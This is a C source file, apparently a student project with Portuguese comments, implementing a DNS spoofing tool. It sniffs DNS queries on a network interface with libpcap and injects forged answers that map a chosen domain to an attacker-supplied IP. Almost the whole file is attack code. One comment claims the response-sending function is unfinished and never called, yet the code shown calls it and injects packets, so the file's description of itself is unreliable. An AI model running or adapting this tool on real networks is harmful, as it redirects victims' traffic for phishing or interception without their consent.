/**
Autores: 
    Augusto Rodrigues de Souza - ra031357 - augustorsouza@gmail.com
    Leonardo Maia Barbosa - ra107213 - leomaia_eco@yahoo.com.br

Arquivo: 
    dns-spoof.c

parametros:
    --interface   = A interface que será ouvida, ex.: eth0   
    --requisition = Dominio o qual o programa irá responder caso haja uma requisição DNS, ex.: www.uol.com.br
    --ip          = O ip da maquina que será informado na resposta na requisição DNS, ex.: 10.0.0.1
           
plataforma:
    linux
*/

/* Bibliotecas: */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <pcap.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>

/* Constantes: */
#define MAX_SIZE 256
#define PARAMETERS_NUMBER 7
#define ONLY_DNS_FILTER "tcp port 53 || udp port 53" // filtro para obter apenas requisições DNS
#define DNS_HEADER_SIZE_IN_BYTES 12
#define UDP_HEADER_SIZE_IN_BYTES 8
#define SIZE_ETHERNET 14
#define MAX_PACKET_SIZE 1518

/* Variáveis globais: */
char interface[MAX_SIZE] = "";
char requisition[MAX_SIZE] = "";
char ip[MAX_SIZE] = "";
pcap_t *descriptor = NULL;

//DNS Header
//ID=2   QR=0  OPCODE=0  AA = 0  TC=0 RD = 1 RA=0 Z =0  RCCODE=0  QDCOUNT=1 
//ANCOUNT=0 NSCOUNT=0 ARCOUNT=0

/* Estruturas: */
struct ipheader {
    unsigned char      iph_version_and_header_len;
    unsigned char      iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    u_int16_t          iph_flag_and_offset;
    unsigned char      iph_ttl;
    /* unsigned char      iph_flag;*/
    /* unsigned short int iph_offset;*/
    unsigned char      iph_protocol;
    unsigned short int iph_chksum;
    unsigned int       iph_sourceip;
    unsigned int       iph_destip;
};

struct udpheader {
    unsigned short int udph_srcport;
    unsigned short int udph_destport;
    unsigned short int udph_len;
    unsigned short int udph_chksum;
};

struct tcpheader {
    unsigned short int th_sport;
    unsigned short int th_dport;
    unsigned int th_seq;
    unsigned int th_ack;
    unsigned char th_x2:4, th_off:4;
    unsigned char th_flags;
    unsigned short int th_win;
    unsigned short int th_sum;
    unsigned short int th_urp;
}; /* total tcp header length: 20 bytes (=160 bits) */

struct dnsheader {
    u_int16_t id;   
    u_int16_t flags_and_codes; 
    u_int16_t qdcount;
    u_int16_t ancount;
    u_int16_t nscount;
    u_int16_t arcount;         
};

/* Função para mostrar padrao de execucao */
void show_usage_and_exit(void)
{
	printf("Padrao de utilizacao:\n");
   	printf("[obrigatorio] --interface   = A interface que será ouvida, ex.: eth0 \n");
	printf("[obrigatorio] --requisition = Dominio o qual o programa irá responder caso haja uma requisição DNS, ex.: www.uol.com.br\n");
	printf("[obrigatorio] --ip          = O ip da maquina que será informado na resposta na requisição DNS, ex.: 10.0.0.1\n");
	printf("Exemplo de utilização: dns-spoof --interface eth0 --requisition www.uol.com.br --ip 10.0.0.1\n");
	exit(8);
}

/* Função para abrir a interface em modo de procura por requisições DNS */
void start_sniffing_interface_for_dns_traffic(void) {
    struct bpf_program fp;
    char errbuf[PCAP_ERRBUF_SIZE];

    descriptor = pcap_open_live(interface, BUFSIZ, 0, -1, errbuf);

    if(descriptor == NULL) { 
        printf("Erro - pcap_open_live(): %s\n",errbuf); 
        exit(8); 
    }

	if (pcap_compile(descriptor, &fp, ONLY_DNS_FILTER, 0, 0) == -1) {
		fprintf(stderr, "Não foi possível interpretar o filtro %s: %s\n", ONLY_DNS_FILTER, pcap_geterr(descriptor));
		exit(8);
	}
	
	if (pcap_setfilter(descriptor, &fp) == -1) {
		fprintf(stderr, "Não foi possível interpretar o filtro %s: %s\n", ONLY_DNS_FILTER, pcap_geterr(descriptor));
		exit(8);
	}
}

/* Função para extrair o campo "query name" do pacote dns. O resultado é armazenado em qname[]. */
void get_dns_domain_in_query(u_char *query, char qname[]) {
    int i = 0, j = 0;
    while (query[i] != 0x00) { 
        for(j = i; j < i + (int)query[i]; j++) {
            qname[j] = query[j+1];
        }
        qname[j] = '.';
        i = j + 1;
    }
    qname[j] = '\0';
}

/* Esta função seria responsavel pela montagem e envio da resposta do DNS, porém não foi implementada corretamente por falta de tempo.
   Sua chamada está comentada dentro da função process_dns_packet_callback. Conseguimos montar um pacote UDP até o nivel do header DNS
   Ficou faltando o campo Data do DNS (contendo a 'answer') e a chamada a função pcap_sendpacket para enviar de fato o pacote. Alem disso,
   precisariamos tratar uma requisição via TCP */
void send_dns_response(u_int8_t *ether_shost, u_int8_t *ether_dhost, struct in_addr ip_src, struct in_addr ip_dst, u_int16_t port_dst, u_int16_t dns_id, u_char *dns_msg) {
    u_char buffer[MAX_PACKET_SIZE];
    u_char *dns_data;

	struct ether_header *eth_hdr = (struct ether_header *)(buffer); // cabecalho ethernet
	struct ipheader *ip_hdr      = (struct ipheader *)(buffer + sizeof(struct ether_header)); // cabecalho ip
	struct udpheader *udp_hdr    = (struct udpheader *)(buffer + sizeof(struct ether_header) + sizeof(struct ipheader));       // cabecalho udp
	struct dnsheader *dns_hdr    = (struct dnsheader *)(buffer + sizeof(struct ether_header) + sizeof(struct ipheader) + sizeof(struct udpheader));       // cabecalho dns

    int i, j;

    /* Ethernet */
	for (j = 0; j < ETH_ALEN; j++)
    	eth_hdr->ether_dhost[j] = ether_dhost[j]; 
	for (j = 0; j < ETH_ALEN; j++)
    	eth_hdr->ether_shost[j] = ether_shost[j]; 
	eth_hdr->ether_type = htons(ETHERTYPE_IP);

    /* IP */    	    
	ip_hdr->iph_version_and_header_len = 0x45; //ipv4 e header lenght = 20 bytes
	ip_hdr->iph_tos = 0x00;
    ip_hdr->iph_ident  = htons(54321);
    ip_hdr->iph_flag_and_offset = 0;
    ip_hdr->iph_ttl = 0x80;
    ip_hdr->iph_protocol   = 0x11; //udp = 0x11 e tcp = 0x06
    ip_hdr->iph_sourceip = ip_src.s_addr;
    ip_hdr->iph_destip = ip_dst.s_addr;
    
    /* UDP */
    udp_hdr->udph_srcport = htons(53); //dns port
    udp_hdr->udph_destport = htons(port_dst);
    udp_hdr->udph_chksum = htons(0);
    
    /* DNS Header */
    dns_hdr->id = htons(dns_id);   
    dns_hdr->flags_and_codes = htons(0x8000); //qr=1; opcode=0000; aa=0; tc=0; rd=0; ra=0; zero=000; rcode=0000;
    dns_hdr->qdcount = htons(1);
    dns_hdr->ancount = htons(1);
    dns_hdr->nscount = htons(0);
    dns_hdr->arcount = htons(0);  
    
    /* DNS Data*/
    dns_data = (char*)(buffer + sizeof(struct ether_header) + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader));
    
    i = 0;
    while (dns_msg[i] != 0x00) {
        dns_data[i] = dns_msg[i];
        i++;
    }
    j = i; 
    for(i=j; i<j+5; i++) //copia dos 5 ultimos bytes do campo 'DNS Message'
        dns_data[i] = dns_msg[i];
        
    dns_data[i++] = 0xC0; dns_data[i++] = 0x0C; //NAME = 12 bytes de offset
    dns_data[i++] = 0x00; dns_data[i++] = 0x01; //TYPE = A (host adress)
    dns_data[i++] = 0x00; dns_data[i++] = 0x01; //CLASS = IN
    dns_data[i++] = 0x00; dns_data[i++] = 0x00; dns_data[i++] = 0x04; dns_data[i++] = 0xB0; //TTL = 20 minutos
    dns_data[i++] = 0x00; dns_data[i++] = 0x04; //Data lenght = 4 bytes
    
    /* Adrr. do answer do DNS */
    struct in_addr *answer_andress = (struct in_addr *)(dns_data + i);
    
    if (inet_aton(ip, answer_andress) == 0)
        printf("Falha na conversão do numero ip em send_dns_response()\n");
    
    i = i + 4;
    
    /* Preenchimento dos tamanhos faltantes */
    udp_hdr->udph_len  = htons(sizeof(struct udpheader) + sizeof(struct dnsheader) + i);
    ip_hdr->iph_len = htons(sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + i);
    ip_hdr->iph_chksum = 0; 
    
    if (pcap_inject(descriptor, buffer, (size_t)(sizeof(struct ether_header) + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + i)) <= 0)
        printf("Erro no envio do pacote\n");
}

/* Callback para processar o pacote recebido */
void process_dns_packet_callback(u_char *useless, const struct pcap_pkthdr *pkthdr, const u_char *packet) {
	const struct ether_header *ethernet; // cabecalho ethernet
	const struct ip *ip_hdr;             // cabecalho ip
	const struct dnsheader *dns_hdr;         // cabecalho dns
    u_int size_ip;
	u_char *transport_hdr; // cabecalho da camada de transporte (tcp ou udp)
	u_char *dns_msg_start;
	char dns_qname[MAX_SIZE];
    u_int16_t source_port;
    
	ethernet = (struct ether_header*)(packet);
    ip_hdr = (struct ip*)(packet + SIZE_ETHERNET);
    size_ip = (ip_hdr->ip_hl)*4;
	if (size_ip < 20) {
		printf("Cabeçalho ip de tamanho invalido: %u bytes\n", size_ip);
		return;
	}

    transport_hdr = (u_char*)(packet + SIZE_ETHERNET + size_ip);
    source_port = (((u_int16_t)transport_hdr[0] << 8 & 0xFF00) + (u_int16_t)transport_hdr[1] ) ;   
    
    /* Caso de pacote UDP */
    if (ip_hdr->ip_p == 17) {
        dns_hdr = (struct dnsheader*)(packet + SIZE_ETHERNET + size_ip + UDP_HEADER_SIZE_IN_BYTES);
        dns_msg_start = (u_char*)(packet + SIZE_ETHERNET + size_ip + UDP_HEADER_SIZE_IN_BYTES + DNS_HEADER_SIZE_IN_BYTES);
    }
    /* Caso de pacote TCP */
    else if (ip_hdr->ip_p == 6) {
        u_char tcp_data_offset;
        tcp_data_offset = transport_hdr[12]; // O campo data offset é 13o. byte do cabeçalho tcp (tamanho do cabeçalho tcp)
        dns_hdr = (struct dnsheader*)(packet + SIZE_ETHERNET + size_ip + tcp_data_offset);
        dns_msg_start = (u_char*)(packet + SIZE_ETHERNET + size_ip + tcp_data_offset + DNS_HEADER_SIZE_IN_BYTES);
    }
    
    get_dns_domain_in_query(dns_msg_start, dns_qname);
    
    if (!strcmp(requisition, dns_qname)) {
        printf("O host %s fez uma requisição a %s\n", inet_ntoa(ip_hdr->ip_src), dns_qname);
        //printf("Resta responder o requisitante (MAC %s; IP %s; porta %d;) dizendo que o host requisitado está no ip %s\n", (char*)ether_ntoa(ethernet->ether_shost), inet_ntoa(ip_hdr->ip_src), source_port, ip);
        send_dns_response(/*de:*/(u_int8_t *)ethernet->ether_dhost, /*para:*/(u_int8_t *)ethernet->ether_shost, /*de:*/ ip_hdr->ip_dst, /*para:*/ ip_hdr->ip_src, /*de:*/source_port, dns_hdr->id, dns_msg_start);
    }
    return;    
}

/* Função main */
int main(int argc, char *argv[]) {
    int i; // contador auxiliar

    if (getuid()){
        printf("Por favor, rode este programa como root\n");
        return(1);
    }

    /* Se o numero de paramestros passados não é o esperado, exibe mensagem de erro */    
    if (argc != PARAMETERS_NUMBER) 
        show_usage_and_exit();
    
    /* Extrai parametros */
    for(i=1; i<PARAMETERS_NUMBER; i=i+2) {
        if (!strcmp(argv[i], "--interface"))
            strcpy(interface, argv[i+1]);
        else if (!strcmp(argv[i], "--requisition"))
            strcpy(requisition, argv[i+1]);
        else if (!strcmp(argv[i], "--ip"))
            strcpy(ip, argv[i+1]);
    }

    /* Se algum dos parametros não foi settado corretamente, exibe mensagem de erro */
    if ((!strcmp(interface, "")) || (!strcmp(requisition, "")) || (!strcmp(ip, "")))
        show_usage_and_exit();

    /* Inicio do sniffing da interface por requisições DNS */
    start_sniffing_interface_for_dns_traffic();
    
    pcap_loop(descriptor, -1, process_dns_packet_callback, NULL);
    
    return(0);
}

